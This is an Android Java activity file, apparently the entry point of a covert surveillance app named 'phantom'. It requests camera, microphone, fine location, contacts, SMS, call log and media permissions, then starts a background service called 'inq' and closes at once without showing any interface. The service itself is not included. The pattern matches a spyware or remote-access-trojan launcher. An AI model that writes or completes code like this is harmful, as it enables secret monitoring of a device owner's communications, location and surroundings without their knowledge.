package com.tenix.phantom;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    private static final int REQ = 1;

    @Override
    protected void onCreate(Bundle s) {
        super.onCreate(s);
        List<String> needed = getNeededPermissions();
        if (needed.isEmpty()) {
            startService(new Intent(this, inq.class));
            finish();
        } else {
            if (Build.VERSION.SDK_INT >= 23) {
                requestPermissions(needed.toArray(new String[0]), REQ);
            } else {
                startService(new Intent(this, inq.class));
                finish();
            }
        }
    }

    private List<String> getNeededPermissions() {
        List<String> list = new ArrayList<>();
        if (Build.VERSION.SDK_INT < 23) return list;
        String[] perms;
        if (Build.VERSION.SDK_INT >= 33) {
            perms = new String[]{
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CALL_LOG
            };
        } else {
            perms = new String[]{
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CALL_LOG
            };
        }
        for (String p : perms) {
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) list.add(p);
        }
        return list;
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] perms, int[] results) {
        startService(new Intent(this, inq.class));
        finish();
    }
}
